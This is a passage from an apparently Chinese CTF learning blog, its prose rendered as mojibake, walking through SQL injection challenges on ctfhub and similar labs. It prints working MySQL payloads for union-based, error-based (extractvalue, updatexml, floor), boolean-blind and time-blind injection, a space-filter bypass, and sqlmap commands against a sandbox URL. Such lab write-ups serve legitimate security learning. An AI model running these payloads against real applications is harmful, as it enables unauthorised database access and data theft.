äº†ä¸€ä¸ªä¸´æ—¶åˆ—ï¼Œç»“æœçœ‹å›¾ï¼Œç¬¬ä¸€åˆ—æ˜¯æ•°æ®åº“ä¸­çš„æ•°æ®ï¼Œç¬¬äºŒåˆ—æ˜¯æ·»åŠ çš„ä¸´æ—¶åˆ—1</p><p>å› æ­¤åœ¨æŸ¥è¯¢çš„flagåè¿˜æœ‰ä¸€ä¸ªå€¼ä¸º1çš„ä¸´æ—¶åˆ—</p><p><strong>è§£æ³•äºŒ</strong></p><p>æŠŠ&quot;||&quot;å˜æˆå­—ç¬¦ä¸²è¿æ¥ç¬¦ï¼Œè€Œä¸æ˜¯æˆ–ã€‚è¿™é‡Œæ¶‰åŠåˆ°mysqlä¸­sql_modeå‚æ•°è®¾ç½®ï¼Œè®¾ç½®<code>sql_mode=pipes_as_concat</code>å­—ç¬¦å°±å¯ä»¥è®¾ç½®ã€‚</p><p>payloadï¼š1;set sql_mode=PIPES_AS_CONCAT;select 1</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/sql/image-20210617021450142.png" alt="image-20210617021450142"></p><p>ä¹Ÿèƒ½è·å¾—flagã€‚</p><p>è¿™æ˜¯æŸ¥è¯¢è¯­å¥ç›¸å½“äºselect 1flag from Flag</p><p>(ä¸å¤ªæ‡‚ä¸ºå•¥è¿™æ ·ä¹Ÿèƒ½æŸ¥å‡ºæ¥ï¼Œ1flagæ˜¯åˆ—åå¦‚æœFlagè¡¨é‡Œæ²¡æœ‰è¿™ä¸€åˆ—å‘¢ï¼Ÿï¼Ÿ)</p><h2 id="æå®¢å¤§æŒ‘æˆ˜-2019-LoveSQL"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-LoveSQL" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]LoveSQL"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]LoveSQL</h2><p>ç”¨åˆ°äº†è”åˆæŸ¥è¯¢</p><p><a href="https://www.cnblogs.com/guoqingsentou/p/13488796.html">åŸç†ç¯‡â€”â€”sqlæ³¨å…¥2ï¼šè”åˆæŸ¥è¯¢æ³¨å…¥ - è¿™å¤ªç§ƒç„¶äº† - åšå®¢å›­ (cnblogs.com)</a></p><p><a href="https://blog.csdn.net/weixin_42277564/article/details/80583959">SQLæ³¨å…¥ä¹‹è”åˆæŸ¥è¯¢æ³¨å…¥_selecthchçš„åšå®¢-CSDNåšå®¢_è”åˆæ³¨å…¥</a></p><p>å‚è€ƒä¸€ä¸‹</p><p>å¸¸è§„æ­¥éª¤</p><p>ã€€            1. åˆ¤æ–­æ³¨å…¥ç‚¹</p><p>ã€€ã€€ã€€ã€€2. åˆ¤æ–­æ³¨å…¥ç±»å‹ï¼ˆæ•°å­—å‹å‹orå­—ç¬¦å‹ï¼‰</p><p>ã€€ã€€ã€€ã€€3. åˆ¤æ–­å­—æ®µæ•°</p><p>ã€€ã€€ã€€ã€€4. åˆ¤æ–­å›æ˜¾ä½</p><p>ã€€ã€€ã€€ã€€5. ç¡®å®šæ•°æ®åº“å</p><p>ã€€ã€€ã€€ã€€6. ç¡®å®šè¡¨å</p><p>ã€€ã€€ã€€ã€€7. ç¡®å®šå­—æ®µå</p><p>ã€€ã€€ã€€ã€€8. æ‹¿åˆ°æ•°æ®</p><p>1.åˆ¤æ–­æ³¨å…¥ç‚¹</p><p>â€‹            åœ¨è¾“å…¥çš„ç”¨æˆ·ååæ·»åŠ å•å¼•å·è¿”å›å‡ºé”™ï¼ŒçŒœæµ‹å­˜åœ¨æ³¨å…¥</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/sql/image-20210617122257987.png" alt="image-20210617122257987"></p><p>2.åˆ¤æ–­æ³¨å…¥ç±»å‹</p><p>â€‹            åœ¨ç”¨æˆ·ååè¾“å…¥1â€™ or 1#åæˆåŠŸè¿›å…¥ï¼Œä½†è¿˜æ˜¯æ²¡æœ‰æ‹¿åˆ°flagï¼Œå› æ­¤ç»§ç»­å°è¯•æ³¨å…¥</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/sql/image-20210617122350388.png" alt="image-20210617122350388"></p><p>3.åˆ¤æ–­å­—æ®µæ•°</p><p>â€‹        å½“order by 4æ—¶å‡ºé”™ï¼Œå› æ­¤åº”æœ‰ä¸‰ä¸ªå­—æ®µæ•°</p><p>4.åˆ¤æ–­å›æ˜¾ä½</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/sql/image-20210617122732266.png" alt="image-20210617122732266"></p><p>5ã€‚ç¡®å®šæ•°æ®åº“å</p><p>â€‹        ä¸ºäº†è·å–æ‰€æœ‰æ•°æ®åº“åï¼Œè¦åˆ©ç”¨group_concat()å‡½æ•°ä»¤å…¶ä¸€æ¬¡æ€§æ˜¾ç¤ºå‡ºæ¥</p><pre class="language-none"><code class="language-none">1&#39; union select 1,2,group_concat(database());#</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/sql/image-20210617123129571.png" alt="image-20210617123129571"></p><p>6.ç¡®å®šè¡¨å</p><pre class="language-none"><code class="language-none">1&#39; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema&#x3D;database();#</code></pre><p><strong>ã€INFORMATION_SCHEMA æ•°æ®åº“ã€‘</strong> æ˜¯MySQLè‡ªå¸¦çš„ï¼Œå®ƒæä¾›äº†è®¿é—®æ•°æ®åº“ <strong>å…ƒæ•°æ®</strong> çš„æ–¹å¼ã€‚å…ƒæ•°æ®æ˜¯å…³äºæ•°æ®çš„æ•°æ®ï¼Œå¦‚æ•°æ®åº“åæˆ–è¡¨åï¼Œåˆ—çš„æ•°æ®ç±»å‹ï¼Œæˆ–è®¿é—®æƒé™ç­‰ã€‚</p><p>å¸¸ç”¨å­—æ®µ</p><table><thead><tr><th>å­—æ®µ</th><th>å«ä¹‰</th></tr></thead><tbody><tr><td>Table_catalog</td><td>æ•°æ®è¡¨ç™»è®°ç›®å½•</td></tr><tr><td>Table_schema</td><td>æ•°æ®è¡¨æ‰€å±çš„æ•°æ®åº“å</td></tr><tr><td>Table_name</td><td>è¡¨åç§°</td></tr><tr><td>Table_type</td><td>è¡¨ç±»å‹[system view|base table]</td></tr><tr><td>Engine</td><td>ä½¿ç”¨çš„æ•°æ®åº“å¼•æ“[MyISAM|CSV|InnoDB]</td></tr><tr><td>Version</td><td>ç‰ˆæœ¬ï¼Œé»˜è®¤å€¼10</td></tr><tr><td>Row_format</td><td>è¡Œæ ¼å¼[Compact|Dynamic|Fixed]</td></tr><tr><td>Table_rows</td><td>è¡¨é‡Œæ‰€å­˜å¤šå°‘è¡Œæ•°æ®</td></tr><tr><td>Avg_row_length</td><td>å¹³å‡è¡Œé•¿åº¦</td></tr><tr><td>Data_length</td><td>æ•°æ®é•¿åº¦</td></tr><tr><td>Max_data_length</td><td>æœ€å¤§æ•°æ®é•¿åº¦</td></tr><tr><td>Index_length</td><td>ç´¢å¼•é•¿åº¦</td></tr><tr><td>Data_free</td><td>ç©ºé—´ç¢ç‰‡</td></tr><tr><td>Auto_increment</td><td>åšè‡ªå¢ä¸»é”®çš„è‡ªåŠ¨å¢é‡å½“å‰å€¼</td></tr><tr><td>Create_time</td><td>è¡¨çš„åˆ›å»ºæ—¶é—´</td></tr><tr><td>Update_time</td><td>è¡¨çš„æ›´æ–°æ—¶é—´</td></tr><tr><td>Check_time</td><td>è¡¨çš„æ£€æŸ¥æ—¶é—´</td></tr><tr><td>Table_collation</td><td>è¡¨çš„å­—ç¬¦æ ¡éªŒç¼–ç é›†</td></tr><tr><td>Checksum</td><td>æ ¡éªŒå’Œ</td></tr><tr><td>Create_options</td><td>åˆ›å»ºé€‰é¡¹</td></tr><tr><td>Table_comment</td><td>è¡¨çš„æ³¨é‡Šã€å¤‡æ³¨</td></tr></tbody></table><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/sql/image-20210617123612820.png" alt="image-20210617123612820"></p><ol start="7"><li><p>ç¡®å®šå­—æ®µå</p><p>çŒœæµ‹flagåº”è¯¥åœ¨l0ve1ysq1è¡¨ä¸­ï¼Œå› æ­¤æŸ¥æ‰¾è¯¥è¡¨å†…çš„å­—æ®µå</p><pre class="language-sql" data-language="sql"><code class="language-sql">1&#39; union select 1,2,group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;l0ve1ysq1&#39;;#</code></pre></li></ol><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/sql/image-20210617164130341.png" alt="image-20210617164130341"></p><p>8.æ‹¿åˆ°æ•°æ®</p><p>æŸ¥æ‰¾è¿™ä¸‰åˆ—ä¸­çš„å…¨éƒ¨æ•°æ®ï¼Œåˆ©ç”¨group_concat();</p><pre class="language-sql" data-language="sql"><code class="language-sql">1&#39; union select 1,2,group_concat(id,username,password) from l0ve1ysq1#;</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/sql/image-20210617164638259.png" alt="image-20210617164638259"></p><p>å¾—åˆ°flag</p><p><strong>MySQLé»˜è®¤æœ‰â€œinformation_schemaâ€çš„æ•°æ®åº“ï¼Œè¯¥åº“ä¸­æœ‰ä¸‰ä¸ªè¡¨åï¼š</strong></p><p>1ã€SCHEMATAï¼šå­˜å‚¨è¯¥ç”¨æˆ·åˆ›å»ºçš„æ‰€æœ‰æ•°æ®åº“çš„åº“åï¼Œè®°å½•åº“åçš„å­—æ®µä¸ºSCHEMA_NAMEã€‚<br>2ã€TABLESï¼šå­˜å‚¨è¯¥ç”¨æˆ·åˆ›å»ºçš„æ‰€æœ‰æ•°æ®åº“çš„åº“åå’Œè¡¨åï¼Œè®°å½•åº“åå’Œè¡¨åçš„å­—æ®µä¸ºTABLE_SCHEMAå’ŒTABLE_NAMEã€‚<br>3ã€COLUMNSï¼šå­˜å‚¨è¯¥ç”¨æˆ·åˆ›å»ºçš„æ‰€æœ‰æ•°æ®åº“çš„åº“åã€è¡¨åå’Œå­—æ®µåï¼Œåº“åã€è¡¨åå’Œå­—æ®µåä¸ºTABLE_SCHEMAã€TABLE_NAMEå’ŒCOLUMN_NAMEã€‚</p><h2 id="ctfhubâ€”SQL-æ•´æ•°å‹æ³¨å…¥"><a href="#ctfhubâ€”SQL-æ•´æ•°å‹æ³¨å…¥" class="headerlink" title="ctfhubâ€”SQL æ•´æ•°å‹æ³¨å…¥"></a>ctfhubâ€”SQL æ•´æ•°å‹æ³¨å…¥</h2><p>è¾“å…¥1æœ‰å›æ˜¾</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/sql/image-20210617171453199.png" alt="image-20210617171453199"></p><p>è¾“å…¥1 and 1=2æ— å›æ˜¾ï¼Œæ—¢å­˜åœ¨æ³¨å…¥ç‚¹ï¼Œæ•´æ•°å‹æ³¨å…¥</p><p>åˆ©ç”¨order byå¯çŸ¥å­˜åœ¨ä¸¤ä¸ªå­—æ®µ</p><p>åˆ©ç”¨è”åˆæŸ¥è¯¢æŸ¥è¯¢æ•°æ®åº“åç§°</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/sql/image-20210617171639524.png" alt="image-20210617171639524"></p><p>å†æŸ¥æ‰¾è¡¨å</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/sql/image-20210617171824424.png" alt="image-20210617171824424"></p><p>flagåº”è¯¥å°±åœ¨flagè¡¨å†…ï¼Œå†æŸ¥æ‰¾å­—æ®µå</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/sql/image-20210617171902588.png" alt="image-20210617171902588"></p><p>æœ€åå¾—åˆ°flag</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/sql/image-20210617171939691.png" alt="image-20210617171939691"></p><h2 id="ctfhubâ€”SQLå­—ç¬¦å‹æ³¨å…¥"><a href="#ctfhubâ€”SQLå­—ç¬¦å‹æ³¨å…¥" class="headerlink" title="ctfhubâ€”SQLå­—ç¬¦å‹æ³¨å…¥"></a>ctfhubâ€”SQLå­—ç¬¦å‹æ³¨å…¥</h2><p>åˆ©ç”¨order byåˆ¤æ–­å­—æ®µæ•°</p><p>è¾“å…¥-1&#39; union select 1,2#åˆ¤æ–­å›æ˜¾ä½ç½®</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/sql/image-20210617225730001.png" alt="image-20210617225730001"></p><p>æŸ¥æ•°æ®åº“å</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/sql/image-20210617221940482.png" alt="image-20210617221940482"></p><p>æŸ¥è¡¨å</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/sql/image-20210617221849032.png" alt="image-20210617221849032"></p><p>æŸ¥å­—æ®µå</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/sql/image-20210617224854046.png" alt="image-20210617224854046"></p><p>æŸ¥flag        -1&#39; union select 1,group_concat(flag) from flag#</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/sql/image-20210617225605950.png" alt="image-20210617225605950"></p><p>æ„Ÿè§‰å’Œæ•´æ•°å‹æ³¨å…¥å·®ä¸å¤š</p><h2 id="ctfhubâ€”æŠ¥é”™æ³¨å…¥"><a href="#ctfhubâ€”æŠ¥é”™æ³¨å…¥" class="headerlink" title="ctfhubâ€”æŠ¥é”™æ³¨å…¥"></a>ctfhubâ€”æŠ¥é”™æ³¨å…¥</h2><p>åˆ©ç”¨xpathè¯­æ³•é”™è¯¯æ¥è¿›è¡ŒæŠ¥é”™æ³¨å…¥ä¸»è¦åˆ©ç”¨<code>extractvalue</code>å’Œ<code>updatexml</code>ä¸¤ä¸ªå‡½æ•°ã€‚</p><p><strong>extractvalue()</strong></p><pre class="language-none"><code class="language-none">å‡½æ•°åŸå‹ï¼šextractvalue(xml_document,Xpath_string)æ­£å¸¸è¯­æ³•ï¼šextractvalue(xml_document,Xpath_string);ç¬¬ä¸€ä¸ªå‚æ•°ï¼šxml_documentæ˜¯stringæ ¼å¼ï¼Œä¸ºxmlæ–‡æ¡£å¯¹è±¡çš„åç§°ç¬¬äºŒä¸ªå‚æ•°ï¼šXpath_stringæ˜¯xpathæ ¼å¼çš„å­—ç¬¦ä¸²ä½œç”¨ï¼šä»ç›®æ ‡xmlä¸­è¿”å›åŒ…å«æ‰€æŸ¥è¯¢å€¼çš„å­—ç¬¦ä¸²</code></pre><p>ç¬¬äºŒä¸ªå‚æ•° xmlä¸­çš„ä½ç½®æ˜¯å¯æ“ä½œçš„åœ°æ–¹ï¼Œxmlæ–‡æ¡£ä¸­æŸ¥æ‰¾å­—ç¬¦ä½ç½®æ˜¯ç”¨ /xxx/xxx/xxx/â€¦è¿™ç§æ ¼å¼ï¼Œå¦‚æœæˆ‘ä»¬å†™å…¥å…¶ä»–æ ¼å¼ï¼Œå°±ä¼šæŠ¥é”™ï¼Œå¹¶ä¸”ä¼šè¿”å›æˆ‘ä»¬å†™å…¥çš„éæ³•æ ¼å¼å†…å®¹ï¼Œè€Œè¿™ä¸ªéæ³•çš„å†…å®¹å°±æ˜¯æˆ‘ä»¬æƒ³è¦æŸ¥è¯¢çš„å†…å®¹</p><p>payloadæ¨¡æ¿</p><pre class="language-none"><code class="language-none">&#39; and extractvalue(1,concat(0x7e,(select @@version),0x7e))</code></pre><ol><li>0x7e=â€™~â€™</li><li>concat(â€˜aâ€™,â€˜bâ€™)=â€œabâ€</li><li>version()=@@version</li><li> â€˜~â€˜å¯ä»¥æ¢æˆâ€™#â€™ã€â€™$&#39;ç­‰ä¸æ»¡è¶³xpathæ ¼å¼çš„å­—ç¬¦</li><li> extractvalue()èƒ½æŸ¥è¯¢å­—ç¬¦ä¸²çš„æœ€å¤§é•¿åº¦ä¸º32ï¼Œå¦‚æœæˆ‘ä»¬æƒ³è¦çš„ç»“æœè¶…è¿‡32ï¼Œå°±è¦ç”¨substring()å‡½æ•°æˆªå–æˆ–limitåˆ†é¡µï¼Œä¸€æ¬¡æŸ¥çœ‹æœ€å¤š32ä½</li></ol><p>è¿”å›ç»“æœä¸èƒ½è¶…è¿‡ä¸€æ¡</p><p>è‹¥è¶…è¿‡åˆ™éœ€å†æŸ¥è¯¢è¯­å¥åæ·»åŠ limit x,1æˆ–ç”¨group_concat()å‡½æ•°</p><p><strong>updatexml()</strong></p><p>updatexml()å‡½æ•°ä¸extractvalue()ç±»ä¼¼ï¼Œæ˜¯æ›´æ–°xmlæ–‡æ¡£çš„å‡½æ•°ã€‚</p><p>and 1=(updataxml(1,concat(0x7e,(sql_inject),0x7e),1))</p><p><strong>flood()</strong></p><p>åŸç†è¿˜æ²¡çœ‹æ˜ç™½ï¼ˆ</p><p>å…ˆæ”¾ä¸ªæ¨¡æ¿åœ¨è¿™</p><pre class="language-none"><code class="language-none">1 Union select count(*),concat((æŸ¥è¯¢è¯­å¥),0x26,floor(rand(0)*2))x from information_schema.columns group by x;</code></pre><p><strong>é¢˜ç›®ï¼š</strong></p><p><strong>åˆ©ç”¨extractvalue</strong></p><p>è¾“å…¥å•å¼•å·æç¤ºè¯­æ³•é”™è¯¯ï¼Œè¾“å…¥and 1=1èƒ½æ­£ç¡®æŸ¥è¯¢ï¼ŒçŒœæµ‹ä¸ºæ•°å­—å‹ï¼Œåˆ©ç”¨extractvalueå‡½æ•°çˆ†åº“å</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/sql/image-20210618145637443.png" alt="image-20210618145637443"></p><p>å†çˆ†è¡¨å</p><p>è¿™é‡Œæç¤ºå¤ªé•¿å› æ­¤åˆ©ç”¨group_concat()å‡½æ•°</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/sql/image-20210618150129458.png" alt="image-20210618150129458"></p><p>çŒœåˆ°flagå†flagè¡¨å†…çˆ†åˆ—å</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/sql/image-20210618150241862.png" alt="image-20210618150241862"></p><p>æœ€åæŸ¥è¯¢å†…å®¹</p><p>1 and extractvalue(1,concat(0x7e,(select flag from flag limit 0,1),0x7e))</p><p>ç”±äºextractvalueå‡½æ•°åªèƒ½æ˜¾ç¤º32ä½å­—ç¬¦ï¼Œæ‰€ä»¥è¦åˆ©ç”¨substringå‡½æ•°è¿›è¡Œåˆ†å‰²</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/sql/image-20210618150615881.png" alt="image-20210618150615881"></p><p>åˆ©ç”¨substringæŸ¥çœ‹å³è¾¹31ä½å­—ç¬¦</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/sql/image-20210618181313759.png" alt="image-20210618181313759"></p><p>æœ€åå¯ä»¥æ‹¿åˆ°flag</p><p>ctfhub{ff3bb0327849e1b9e0e6abfd}</p><p><strong>åˆ©ç”¨updataxmlå‡½æ•°</strong></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/sql/image-20210618181744673.png" alt="image-20210618181744673"></p><p><strong>åˆ©ç”¨floodå‡½æ•°</strong></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/sql/image-20210618182036292.png" alt="image-20210618182036292"></p><h2 id="ctfhubâ€”å¸ƒå°”ç›²æ³¨"><a href="#ctfhubâ€”å¸ƒå°”ç›²æ³¨" class="headerlink" title="ctfhubâ€”å¸ƒå°”ç›²æ³¨"></a>ctfhubâ€”å¸ƒå°”ç›²æ³¨</h2><p>åªæœ‰å‡ºç°æ•°æ®æäº¤æ­£ç¡®å’Œé”™è¯¯ä¸¤ç§ä¸åŒçš„é¡µé¢ï¼ˆæŠ¥é”™å‹è‡³å°‘è¯­æ³•é”™è¯¯ä¼šå›æ˜¾é”™è¯¯åˆ°é¡µé¢ä¸Šï¼‰æˆ–è€…æ— æ³•ä½¿ç”¨è”åˆæŸ¥è¯¢ã€‚</p><p><strong>æ­¥éª¤</strong></p><ol><li>ç”¨é”™è¯¯å’Œæ­£ç¡®ä¸¤ç§åé¦ˆè¿›è¡Œé€ä¸€è¯•éªŒï¼ŒçŒœæµ‹å‡ºé—­åˆ</li><li>åˆ©ç”¨lengthæ¥é€ä¸€æµ‹è¯•å­—ç¬¦ä¸²çš„é•¿åº¦</li><li>åˆ©ç”¨substræ¥é€ä¸€çš„æµ‹è¯•ï¼Œæµ‹è¯•åº“åã€è¡¨åã€åˆ—åå’Œå…¶ä»–æ•°æ®</li><li>æœ€åå¾—åˆ°æ•°æ®</li></ol><p>å‡½æ•°</p><pre class="language-none"><code class="language-none">length()è¿”å›å­—ç¬¦ä¸²çš„é•¿åº¦length(abc)è¿”å›3ï¼Œè¡¨ç¤ºabcå­—ç¬¦ä¸²é•¿åº¦ä¸º3substr()æˆªå–å­—ç¬¦ä¸²substr(abc,1,1)è¿”å›aï¼Œä»abcçš„ç¬¬ä¸€ä½å¼€å§‹æˆªå–ï¼Œæ­¥é•¿ä¸º1mid()å–å‡ºå­—ç¬¦ä¸²çš„ä¸€éƒ¨åˆ†å€¼mid(abc,1,1)è¿”å›aï¼Œä»abcçš„ç¬¬ä¸€ä½å¼€å§‹å–ï¼Œæ­¥é•¿ä¸º1ï¼Œä¸substr()ç”¨æ³•ä¸€è‡´left()å–å‡ºå­—ç¬¦ä¸²å·¦è¾¹çš„å‡ ä¸ªæ•°æ®left(abc,1)è¿”å›aleft(abc,2)è¿”å›abright()å–å‡ºå³è¾¹çš„å‡ ä¸ªæ•°æ®right(abc,1)è¿”å›cright(abc,2)è¿”å›bcord() ä¸ascii()è¿”å›ä¸€ä¸ªå­—ç¬¦çš„asciiç å€¼ascii(s)è¿”å›114hex()è¿”å›16è¿›åˆ¶æ•°</code></pre><p>å…ˆçŒœæ•°æ®åº“é•¿åº¦&gt;3æ—¶è¿”å›æˆåŠŸï¼Œ&gt;4æ—¶è¿”å›å¤±è´¥å¯ä»¥å¾—åˆ°æ•°æ®åº“åé•¿åº¦ä¸º4</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/sql/image-20210618213033658.png" alt="image-20210618213033658"></p><p>æ¥ä¸‹æ¥åˆ©ç”¨substrå’Œasciiå‡½æ•°çŒœåå­—</p><p>é¦–å­—æ¯asciiç å¤§äº114æ—¶è¿”å›æˆåŠŸï¼Œå¤§äº115æ—¶è¿”å›å¤±è´¥ï¼Œå¯å¾—åˆ°é¦–å­—æ¯çš„asciiç ä¸º115ï¼Œä¸ºs</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/sql/image-20210618213347153.png" alt="image-20210618213347153"></p><p>ç¬¬äºŒä½åŒç†å¯ä»¥å¾—åˆ°asciiç å€¼ä¸º113ï¼Œä¸ºq</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/sql/image-20210618213535384.png" alt="image-20210618213535384"></p><p>æœ€åå¯å¾—æ•°æ®åº“åä¸ºsqli</p><p>å†çŒœè¡¨å</p><p>1 and substr((select table_name from information_schema.tables where table_schema=&#39;sqli&#39; limit 0,1),1,1)=&#39;n&#39;</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/sql/image-20210618214343490.png" alt="image-20210618214343490"></p><p>ï¼ˆæ„Ÿè§‰è¿™éƒ¨åˆ†åº”è¯¥ç”¨bpæŠ“åŒ…çˆ†ç ´æ›´æ–¹ä¾¿ï¼‰</p><p>æŠŠlimitåçš„0æ”¹ä¸º1çŒœç¬¬äºŒä¸ªè¡¨å</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/sql/image-20210618214721333.png" alt="image-20210618214721333"></p><p>æœ€åèƒ½å¾—åˆ°æœ‰newså’Œflagä¸¤ä¸ªè¡¨</p><p>å†çŒœå­—æ®µ</p><p>é¦–å­—æ¯asciiç ä¸º102ï¼Œä¸ºf</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/sql/image-20210618215609088.png" alt="image-20210618215609088"></p><p>åŒç†èƒ½å¾—åˆ°å­—æ®µåä¸ºflag</p><p>æœ€åçˆ†å†…å®¹</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/sql/image-20210618222859475.png" alt="image-20210618222859475"></p><p>å¤ªå¤šäº†ï¼Œç”¨bpçˆ†ç ´å®Œæ„Ÿè§‰ä¹Ÿå¾ˆéš¾æ‰¾ï¼Œä¼°è®¡ç”¨pyå†™è„šæœ¬ä¼šæ–¹ä¾¿å¾ˆå¤š</p><p><strong>ç”¨sqlmapï¼š</strong></p><p>-u <a href="http://challenge-b896931f16bb5e67.sandbox.ctfhub.com:10800/?id=1">http://challenge-b896931f16bb5e67.sandbox.ctfhub.com:10800/?id=1</a> --dbsæŸ¥åº“å</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/sql/image-20210618224516739.png" alt="image-20210618224516739"></p><p>-u <a href="http://challenge-b896931f16bb5e67.sandbox.ctfhub.com:10800/?id=1">http://challenge-b896931f16bb5e67.sandbox.ctfhub.com:10800/?id=1</a> -D sqli --tables</p><p>æŸ¥è¡¨å</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/sql/image-20210618224721120.png" alt="image-20210618224721120"></p><p>-u <a href="http://challenge-b896931f16bb5e67.sandbox.ctfhub.com:10800/?id=1">http://challenge-b896931f16bb5e67.sandbox.ctfhub.com:10800/?id=1</a> -D sqli -T flag --columnsæŸ¥å­—æ®µå</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/sql/image-20210618225207129.png" alt="image-20210618225207129"></p><p>-u <a href="http://challenge-b896931f16bb5e67.sandbox.ctfhub.com:10800/?id=1">http://challenge-b896931f16bb5e67.sandbox.ctfhub.com:10800/?id=1</a> -D sqli -T flag -C flag --dumpæŸ¥å€¼</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/sql/image-20210618225706653.png" alt="image-20210618225706653"></p><h2 id="ctfhubâ€”æ—¶é—´ç›²æ³¨"><a href="#ctfhubâ€”æ—¶é—´ç›²æ³¨" class="headerlink" title="ctfhubâ€”æ—¶é—´ç›²æ³¨"></a>ctfhubâ€”æ—¶é—´ç›²æ³¨</h2><p>åˆ©ç”¨sleepå‡½æ•°è¿›è¡Œç›²æ³¨</p><p>è‹¥andä¹‹å‰çš„è¯­å¥æ­£ç¡®åˆ™æˆåŠŸæ‰§è¡Œsleep</p><p>èƒ½å¾—åˆ°æ˜¯æ•°å­—å‹æ³¨å…¥</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/sql/image-20210619153620142.png" alt="image-20210619153620142"></p><p>æ¥ä¸‹æ¥åˆ©ç”¨ifè¯­å¥è¿›è¡Œæ³¨å…¥æ˜¯å¦æˆåŠŸçš„åˆ¤æ–­1 and if(æŸ¥è¯¢è¯­å¥,sleep(2),1)</p><p>è‹¥ä¸ºçœŸåˆ™æ‰§è¡Œsleepï¼ˆ2ï¼‰ï¼Œè‹¥ä¸ºå‡åˆ™æ‰§è¡Œ1</p><p>æ¥ä¸‹æ¥æ­¥éª¤ä¸å¸ƒå°”ç›²æ³¨ç›¸ä¼¼</p><p>çŒœæ•°æ®åº“åï¼ˆä¹Ÿå¯ä»¥åˆ©ç”¨asciiç æ¥çŒœï¼Œä½†å› ä¸ºctfhubçš„sqlé¢˜åç§°éƒ½ä¸€æ ·ï¼Œå°±ç›´æ¥è¯•å­—ç¬¦äº†ï¼‰</p><p>1 and if(substr(database(),1,1)=&#39;s&#39;,sleep(2),1)#</p><p>çŒœè¡¨çš„æ•°é‡</p><p>1 and if((select count(table_name) from information_schema.tables  where table_schema=database())=2,sleep(2),1)#</p><p>çŒœè¡¨å</p><p>1 and if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;0,sleep(2),1)#</p><p>å°†limitåçš„0æ”¹ä¸º1å†çŒœç¬¬äºŒä¸ªè¡¨å</p><p>åˆ†åˆ«ä¸ºnews å’Œ flag</p><p>çŒœflagè¡¨å†…å­—æ®µæ•°é‡</p><p>1 and if((select count(column_name) from information_schema.columns  where table_name=&#39;flag&#39;)=1,sleep(2),1)#</p><p>çŒœå­—æ®µå</p><p>1 and if(ascii(substr((select column_name from information_schema.columns where table_name=&#39;flag&#39; limit 0,1),1,1))&gt;102,sleep(2),1)#</p><p>æœ€ç»ˆå¯ä»¥çŒœå‡ºå­—æ®µåä¸ºflag</p><p>å†çŒœå†…å®¹</p><p>1 and if(ascii(substr((select flag from flag limit 0,1),1,1))&gt;99,sleep(2),1)#</p><p>è¿™éƒ¨åˆ†åº”è¯¥è¿˜æ˜¯è¦ç”¨pythonæˆ–è€…sqlmap</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/sql/image-20210619160201466.png" alt="image-20210619160201466"></p><h2 id="è¿‡æ»¤ç©ºæ ¼"><a href="#è¿‡æ»¤ç©ºæ ¼" class="headerlink" title="è¿‡æ»¤ç©ºæ ¼"></a>è¿‡æ»¤ç©ºæ ¼</h2><p>çœ‹é¢˜ç›®å°±çŸ¥é“ç©ºæ ¼è¢«è¿‡æ»¤äº†ï¼Œè¿™é‡Œå¯ä»¥åˆ©ç”¨/**/æ³¨é‡Šç¬¦æ¥æ›¿ä»£ç©ºæ ¼ï¼Œå…¶ä»–æ­¥éª¤å’Œå­—ç¬¦å‹æ³¨å…¥ä¸€æ ·</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/sql/image-20210620113251958.png" alt="image-20210620113251958"></p><p>æœ€åå¾—åˆ°flag</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/sql/image-20210620113632138.png" alt="image-20210620113632138"></p><p>è´´ä¸ªåˆ«äººæ€»ç»“çš„è¿‡æ»¤å’Œç»•è¿‡</p><p><a 